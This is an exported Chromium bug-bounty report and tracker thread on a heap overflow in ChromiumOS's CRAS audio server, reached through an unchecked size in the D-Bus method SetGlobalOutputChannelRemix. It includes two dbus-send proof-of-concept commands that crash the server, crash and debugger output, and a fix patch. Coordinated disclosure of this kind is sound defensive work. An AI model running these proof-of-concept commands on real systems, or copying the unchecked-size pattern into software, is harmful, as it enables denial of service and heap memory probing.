# Security: ChromiumOS CRAS Server D-Bus SetGlobalOutputChannelRemix heap-over-flow

| Field | Value |
|-------|-------|
| **Issue ID** | [40061617](https://issues.chromium.org/issues/40061617) |
| **Status** | New |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Internals>Media>Audio |
| **Platforms** | ChromeOS |
| **Reporter** | hi...@gmail.com |
| **Assignee** | wh...@chromium.org |
| **Created** | 2022-11-06 |
| **Bounty** | $13,000.00 |

## Description

**VULNERABILITY DETAILS**  

CRAS server provides a D-Bus service for the browser to use the audio. Among the methods in the D-Bus Control interface, a method called SetGlobalOutputChannelRemix receives two parameters:

<method name="SetGlobalOutputChannelRemix">
<tp:docstring>
Sets the conversion matrix for global output channel
remixing. The coefficient array represents an N \\* N
conversion matrix M, where N is num\_channels, with
M[i][j] = coefficient[i \\* N + j].
The remix is done by multiplying the conversion matrix
to each N-channel PCM data, i.e M \\* [L, R] = [L', R']
For example, coefficient [0.1, 0.9, 0.4, 0.6] will
result in:
L' = 0.1 \\* L + 0.9 \\* R
R' = 0.4 \\* L + 0.6 \\* R
</tp:docstring>
<arg name="num\_channels" type="i" direction="in"/>
<arg name="coefficient" type="ad" direction="in"/>
</method>

As shown above, CRAS clients in the browser can use this method to set the conversion matrix. The first method parameter num\_channels is int32, which presents the matrix's dimensions. The second parameter coefficient is an array composed of multiple doubles that offer every matrix element.

The bug code relies on handle\_set\_global\_output\_channel\_remix(). When we received the num\_channels and coefficient arguments, we didn't check if num\_channels^2 equals the coefficient's size and copied data from the array using num\_channels as a counter. So if an attacker sends a big num\_channels and a small coefficient array, a heap-over-flow in cras\_channel\_remix\_conv\_create() may happen.

Control Flow: handle\_control\_message() -> handle\_set\_global\_output\_channel\_remix() -> audio\_thread\_config\_global\_remix() -> cras\_channel\_remix\_conv\_create()

struct cras\_fmt\_conv \*cras\_channel\_remix\_conv\_create(unsigned int num\_channels,  

const float \*coefficient)  

{  

...  

conv->ch\_conv\_mtx =  

cras\_channel\_conv\_matrix\_alloc(num\_channels, num\_channels);  

/\* Convert the coeffiencnt array to conversion matrix. \*/  

for (out\_ch = 0; out\_ch < num\_channels; out\_ch++) // <-- num\_channels is received from D-Bus without check  

for (in\_ch = 0; in\_ch < num\_channels; in\_ch++)  

conv->ch\_conv\_mtx[out\_ch][in\_ch] =  

coefficient[in\_ch + out\_ch \* num\_channels]; // <-- coefficient is created by calloc(count, sizeof(\*coefficient)) where count is received from D-Bus without check, overflow!

When we set num\_channels not so big, the matrix containing over-flow data on the heap will send to the audio thread in audio\_thread\_config\_global\_remix(), which may later help the attacker to get sensitive data or other unexpected results.

**VERSION**  

ChromiumOS 109.0.5370.0 (Official Build) (64-bit)

**REPRODUCTION CASE**  

I built a developer disk image of ChromiumOS and booted it from qemu-kvm with 16GB RAM/8 cores. In ChromiumOS, open a shell and input:  

chronos@localhost ~ $ dbus-send --system --dest=org.chromium.cras --type=method\_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:99999 array:double:9

In my case, the CRAS process will crash and report a SEGV exception:  

chronos@localhost ~ $ sudo dmesg  

...  

[ 59.586957] cras[1278]: segfault at 599ed2f6f000 ip 0000599b9bc7f6ed sp 00007ffc2512d000 error 4 in cras[599b9bc0f000+dd000]  

[ 59.586972] Code: 44 89 d1 31 f6 0f 1f 84 00 00 00 00 00 8d 51 f8 0f 10 04 93 0f 10 4c 93 10 41 0f 11 04 b0 41 0f 11 4c b0 10 89 ca 0f 10 04 93 <0f> 10 4c 93 10 41 0f 11 44 b0 20 41 0f 11 4c b0 30 48 83 c6 10 83  

[ 61.602567] init: cras main process (1212) terminated with status 139  

[ 61.602581] init: cras main process ended, respawning

BISECT  

This flaw was introduced seven years ago in commit 2cc79ec9a81d62c9741b489b26c1d2a6660131dd (CRAS: dbus\_control - Add SetGlobalOutputChannelRemix method). Release branches dev/beta/stable are impacted.

PATCH  

Like CRAS server checks vector type parameters in other methods, we need to make sure num\_channels is safe and ((size\_t)num\_channels \* num\_channels == count):

From f3bf2c2cc95f12769473d42429d5221289fba5cf Mon Sep 17 00:00:00 2001  

From: Qiuhao Li [Qiuhao.Li@outlook.com](mailto:Qiuhao.Li@outlook.com)  

Date: Sun, 6 Nov 2022 20:35:24 +0800  

Subject: [PATCH] cras/SetGlobalOutputChannelRemix: check num\_channels and  

coefficient size

## Signed-off-by: Qiuhao Li [Qiuhao.Li@outlook.com](mailto:Qiuhao.Li@outlook.com) Change-Id: I191ddbf196cc91720dc671cf72de5cd2766ef8b4

cras/src/server/cras\_bt\_constants.h | 2 ++  

cras/src/server/cras\_dbus\_control.c | 5 +++++  

2 files changed, 7 insertions(+)

diff --git a/cras/src/server/cras\_bt\_constants.h b/cras/src/server/cras\_bt\_constants.h  

index ea12e728..14cbeeea 100644  

--- a/cras/src/server/cras\_bt\_constants.h  

+++ b/cras/src/server/cras\_bt\_constants.h  

@@ -55,6 +55,8 @@  

#define CRAS\_PLAYER\_IDENTITY\_DEFAULT "DefaultPlayer"  

#define CRAS\_PLAYER\_METADATA\_SIZE\_MAX 128 \* sizeof(char)

+#define CRAS\_REMIXING\_CHANNELS\_NUM\_MAX 128  

+  

#define CRAS\_DEFAULT\_BATTERY\_PROVIDER \  

"/org/chromium/Cras/Bluetooth/BatteryProvider"  

#define CRAS\_DEFAULT\_BATTERY\_PREFIX "/org/bluez/hci0/dev\_"  

diff --git a/cras/src/server/cras\_dbus\_control.c b/cras/src/server/cras\_dbus\_control.c  

index d12f032a..a5372ee8 100644  

--- a/cras/src/server/cras\_dbus\_control.c  

+++ b/cras/src/server/cras\_dbus\_control.c  

@@ -973,6 +973,11 @@ handle\_set\_global\_output\_channel\_remix(DBusConnection \*conn,  

return DBUS\_HANDLER\_RESULT\_NOT\_YET\_HANDLED;  

}

- if ((num\_channels > CRAS\_REMIXING\_CHANNELS\_NUM\_MAX) ||
- ```
    ((size_t)num_channels \* num_channels != count)) {  
  
  ```
- ```
    return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;  
  
  ```
- }
- coefficient = (float \*)calloc(count, sizeof(\*coefficient));  
  
  if (!coefficient)  
  
  return DBUS\_HANDLER\_RESULT\_NOT\_YET\_HANDLED;  
  
  --  
  
  2.34.1

**CREDIT INFORMATION**  

Qiuhao Li (@QiuhaoLi)

Thanks,  

Qiuhao Li

## Attachments

- [1381857_asan.txt](attachments/1381857_asan.txt) (text/plain, 3.8 KB)

## Timeline

### [Deleted User] (2022-11-06)

[Empty comment from Monorail migration]

### ke...@chromium.org (2022-11-07)

[Empty comment from Monorail migration]

### hi...@gmail.com (2022-11-08)

Hi kenrb, could you help to add allenwebb@google.com, jorgelo@chromium.org, et al. (similar to Issue #1320917)?

### hi...@gmail.com (2022-11-08)

[Comment Deleted]

### hi...@gmail.com (2022-11-08)

[Comment Deleted]

### hi...@gmail.com (2022-11-08)

Update: I found a faster way to crash the CRAS server process, avoiding the time-consuming calloc() in cras_channel_remix_conv_create(). Tested on ChromeOS Stable Branch: Version 107.0.5304.92 (Official Build) (64-bit) and the ChromiumOS above.:

dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:64000000 array:double:1.0,0

This command will trigger a SEGV in audio_thread_config_global_remix(), prior to cras_channel_remix_conv_create():

	/* Check if the coefficients represent an identity matrix for remix
	 * conversion, which means no remix at all. If so then leave the
	 * converter as NULL. */
	for (i = 0; i < num_channels; i++) {
		if (coefficient[i * num_channels + i] != 1.0f) { // ←i=0, false
			identity_remix = 0;
			break;
		}
		for (j = i + 1; j < num_channels; j++) {
			if (coefficient[i * num_channels + j] != 0 || // ←i=0, j=1, false
			    coefficient[j * num_channels + i] != 0) { // ← i=0, j=1, num_channels=64000000, overflow!!!
				identity_remix = 0;
				break;

I reproduced the crash on a CRAS Server with debug-info and attached gdb to it to verified the heap overflow:

(gdb) c
Continuing.

Thread 1 "cras" received signal SIGSEGV, Segmentation fault.
0x000058bbf028a2c2 in audio_thread_config_global_remix (thread=0x58bbf0acfdf0, num_channels=64000000, coefficient=coefficient@entry=0x58bbf0ae26d0) at server/audio_thread.c:1141
1141				    coefficient[j * num_channels + i] != 0) {
(gdb) bt
#0  0x000058bbf028a2c2 in audio_thread_config_global_remix (thread=0x58bbf0acfdf0, num_channels=64000000, 
    coefficient=coefficient@entry=0x58bbf0ae26d0) at server/audio_thread.c:1141
#1  0x000058bbf027b160 in handle_set_global_output_channel_remix (conn=0x58bbf0ad7be0, message=0x58bbf0ad9dc0, arg=<optimized out>)
    at server/cras_dbus_control.c:983
#2  0x0000788346c2ba42 in ?? () from target:/usr/lib64/libdbus-1.so.3
#3  0x00007ffcda8e9f90 in ?? ()
#4  0x000058bbf0adab60 in ?? ()
#5  0x00000000da8e9f84 in ?? ()
#6  0x000058bbf0ae30f0 in ?? ()
#7  0x7a311d7306698300 in ?? ()
#8  0x000058bbf0ad9dc0 in ?? ()
#9  0x000058bbf0ad7c18 in ?? ()
#10 0x000058bbf0ad7be0 in ?? ()
#11 0x000058bbf0ad7be0 in ?? ()
#12 0x000058bbf0ad9dc0 in ?? ()
#13 0x00007ffcda8ea0a0 in ?? ()
#14 0x000058bbf026f846 in cras_bt_handle_name_owner_changed (conn=0x58bbf0ad9dc0, message=0x0, arg=<optimized out>) at server/cras_bt_manager.c:372
#15 0x0000788346c1a96f in dbus_connection_dispatch () from target:/usr/lib64/libdbus-1.so.3
#16 0x000058bbf02789b8 in cras_dbus_dispatch (conn=0x58bbf0ad7be0) at server/cras_dbus.c:177
#17 0x000058bbf026f1ff in cras_server_run (profile_disable_mask=profile_disable_mask@entry=0) at server/cras_server.c:721
#18 0x000058bbf026e5f6 in main (argc=<optimized out>, argv=0x7ffcda8ea3f8) at server/cras.c:142
(gdb) list
1136				identity_remix = 0;
1137				break;
1138			}
1139			for (j = i + 1; j < num_channels; j++) {
1140				if (coefficient[i * num_channels + j] != 0 ||
1141				    coefficient[j * num_channels + i] != 0) {
1142					identity_remix = 0;
1143					break;
1144				}
1145			}
(gdb) p num_channels 
$1 = 64000000
(gdb) p sizeof(coefficient)
$2 = 8

Additionally, by leveraging this function, an attacker can check whether data on the heap is equal to 1.0 or 0.

### hi...@gmail.com (2022-11-08)

Finally I ported an asan built CRAS server to my ChromiumOS, here is the heap-buffer-overflow report for the first d-bus PoC (without symbolized).

### ps...@google.com (2022-11-10)

@cychiang - can you take a look, and assign an owner? Thanks.

[Monorail components: Internals>Media>Audio]

### [Deleted User] (2022-11-10)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-11)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-11)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-11)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-12)

[Empty comment from Monorail migration]

### hi...@gmail.com (2022-11-16)

[Comment Deleted]

### [Deleted User] (2022-11-20)

cychiang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### hi...@gmail.com (2022-11-22)

psoberoi@ kindly ping :)

### [Deleted User] (2022-12-01)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-04)

cychiang: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### hi...@gmail.com (2022-12-06)

cychiang@, Could you take a look at this? It's easy to reproduce and fix.

### cy...@chromium.org (2022-12-14)

Hi hiter727, sorry I missed this one.
Thanks for reporting the issue. I am routing this to the team member.


### yu...@chromium.org (2022-12-14)

[Empty comment from Monorail migration]

### yu...@chromium.org (2022-12-14)

[Empty comment from Monorail migration]

### ma...@google.com (2022-12-22)

[BULK EDIT] M-109 Stable promotion date is three weeks out (Jan 12th), we need to start resolving this issue as it is marked as a Stable Release blocker. Please update with a plan for resolution.

### wh...@google.com (2022-12-23)

Hi Matthewjoseph

Thanks for reach out. The fixing patch is ready

https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723

Currently we need to wait merge to M111 upstream and then pick the patch to M110 and M109.

Feel free to raise concern if you have.

### [Deleted User] (2023-01-02)

This ReleaseBlock issue's priority is being increased in accordance with go/cros-bug-slo-guidelines#release-blockers.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cy...@chromium.org (2023-01-02)

Hi Whale, the fix has been merged on ToT. Please check if it creates any regression, and file merge requests to M109 ( stable cut 1/3 ) and M110.
Thanks!

### wh...@google.com (2023-01-03)

Hi Jimmy

https://b.corp.google.com/issues/262475516 is already raise to P0

currently waiting for TPgM help approve for M109 and M110

I will concurrently make sure this work on M109 and M110 branch.

### wh...@google.com (2023-01-03)

[Empty comment from Monorail migration]

### wh...@google.com (2023-01-03)

Merged in M109 and M110.

### [Deleted User] (2023-01-03)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-03)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-03)

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M109. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M110. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [109, 110].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@google.com (2023-01-03)

Dropping Merge-Review-[109|110] as progress is being tracked in this bug b/262475516

### al...@google.com (2023-01-04)

[Empty comment from Monorail migration]

[Monorail blocking: b/262475516]

### [Deleted User] (2023-01-04)

This release blocking issue appears to be targeted for one or more milestones which may have already branched:

 - M109, which branched on 2022-11-10 (Chromium branch: 5414, Chromium branch position: 1070088)

Because this issue was marked as fixed on or after branch day, a merge of any CLs which landed on or after branch day may be required.

If no merge is needed (e.g. the necessary CLs are already present in the relevant branch), please remove the Merge-TBD-## label and replace it with a Merge-NA-## label (where ## corresponds to the milestone under evaluation). If a merge is necessary, please add the appropriate Merge-Request-## labels. If you're not sure, reach out to the relevant release manager (can be found at https://chromiumdash.appspot.com/schedule).

To learn more about the merge process, including how to land any required merges, see https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2023-01-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-01-04)

Congratulations on another one, Qiuhao Li! The VRP Panel has decided to award you $13,000 for this report including bisect bonus and a general bonus for cleverness, as we found this finding to be a unique and interesting finding on Chrome OS. Thank you for your efforts in discovering and reporting this issue to us -- great work! 

### hi...@gmail.com (2023-01-05)

Thanks!

### am...@google.com (2023-01-06)

[Empty comment from Monorail migration]

### wh...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### wh...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### aa...@google.com (2023-01-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1381857?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: b/262475516]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061617)*
